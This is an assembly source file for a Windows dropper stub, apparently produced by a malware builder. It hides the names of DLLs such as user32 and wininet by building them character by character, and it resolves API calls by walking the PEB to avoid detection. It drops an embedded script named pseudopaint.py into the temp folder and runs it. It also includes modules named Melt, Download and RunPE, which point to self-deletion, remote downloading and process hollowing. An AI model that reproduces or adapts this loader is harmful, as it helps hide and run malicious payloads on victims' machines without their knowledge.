format PE GUI 4.0
entry Main

include 'win32wx.inc'
include 'nt.inc'
include 'PebApi.inc'

section '.text' code readable executable

proc Main
	local	DllName[MAX_PATH + 1]:WORD
	local	Payload:DWORD
	local	PayloadSize:DWORD

	; LoadLibrary user32.dll
	lea		eax, [DllName]
	; Load string: user32.dll
	mov		ebx, 'a'
	add		bx, 20
	mov		word[eax + 0], bx ;u
	sub		bx, 2
	mov		word[eax + 2], bx ;s
	sub		bx, 14
	mov		word[eax + 4], bx ;e
	add		bx, 13
	mov		word[eax + 6], bx ;r
	sub		bx, 63
	mov		word[eax + 8], bx ;3
	dec		bx
	mov		word[eax + 10], bx ;2
	sub		bx, 4
	mov		word[eax + 12], bx ;.
	add		bx, 54
	mov		word[eax + 14], bx ;d
	add		bx, 8
	mov		word[eax + 16], bx ;l
	mov		word[eax + 18], bx ;l
	mov		word[eax + 20], 0
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; LoadLibrary shell32.dll
	lea		eax, [DllName]
	; Load string: shell32.dll
	mov		ebx, 'a'
	add		bx, 18
	mov		word[eax + 0], bx ;s
	sub		bx, 11
	mov		word[eax + 2], bx ;h
	sub		bx, 3
	mov		word[eax + 4], bx ;e
	add		bx, 7
	mov		word[eax + 6], bx ;l
	mov		word[eax + 8], bx ;l
	sub		bx, 57
	mov		word[eax + 10], bx ;3
	dec		bx
	mov		word[eax + 12], bx ;2
	sub		bx, 4
	mov		word[eax + 14], bx ;.
	add		bx, 54
	mov		word[eax + 16], bx ;d
	add		bx, 8
	mov		word[eax + 18], bx ;l
	mov		word[eax + 20], bx ;l
	mov		word[eax + 22], 0
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; LoadLibrary shlwapi.dll
	lea		eax, [DllName]
	; Load string: shlwapi.dll
	mov		ebx, 'a'
	add		bx, 18
	mov		word[eax + 0], bx ;s
	sub		bx, 11
	mov		word[eax + 2], bx ;h
	add		bx, 4
	mov		word[eax + 4], bx ;l
	add		bx, 11
	mov		word[eax + 6], bx ;w
	sub		bx, 22
	mov		word[eax + 8], bx ;a
	add		bx, 15
	mov		word[eax + 10], bx ;p
	sub		bx, 7
	mov		word[eax + 12], bx ;i
	sub		bx, 59
	mov		word[eax + 14], bx ;.
	add		bx, 54
	mov		word[eax + 16], bx ;d
	add		bx, 8
	mov		word[eax + 18], bx ;l
	mov		word[eax + 20], bx ;l
	mov		word[eax + 22], 0
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; LoadLibrary wininet.dll
	lea		eax, [DllName]
	; Load string: wininet.dll
	mov		ebx, 'a'
	add		bx, 22
	mov		word[eax + 0], bx ;w
	sub		bx, 14
	mov		word[eax + 2], bx ;i
	add		bx, 5
	mov		word[eax + 4], bx ;n
	sub		bx, 5
	mov		word[eax + 6], bx ;i
	add		bx, 5
	mov		word[eax + 8], bx ;n
	sub		bx, 9
	mov		word[eax + 10], bx ;e
	add		bx, 15
	mov		word[eax + 12], bx ;t
	sub		bx, 70
	mov		word[eax + 14], bx ;.
	add		bx, 54
	mov		word[eax + 16], bx ;d
	add		bx, 8
	mov		word[eax + 18], bx ;l
	mov		word[eax + 20], bx ;l
	mov		word[eax + 22], 0
	pebcall	PEB_Kernel32Dll, PEB_LoadLibraryW, eax

	; ==========================================================================
	; == Custom assembly                                                      ==
	; ==========================================================================

.action_1:
	; Get embedded file: pseudopaint.py
	mov		[Payload], EmbeddedSource1
	mov		[PayloadSize], EmbeddedSource1Size

	; Drop temp\pseudopaint.py and execute (verb: open)
	stdcall	DropFile, 1, [Payload], [PayloadSize], DropFileName1, 0, 1
	test	eax, eax
	jz		.action_1_end

.action_1_end:


	; ==========================================================================
	; == End of custom assembly                                               ==
	; ==========================================================================
.ret:


	pebcall	PEB_Kernel32Dll, PEB_ExitProcess, 0
	ret
endp

include 'PebApi.asm'
include 'Melt.asm'
include 'Compression.asm'
include 'Download.asm'
include 'RunPE.asm'
include 'Drop.asm'

include 'EmbeddedStrings.inc'
include 'EmbeddedSources.inc'
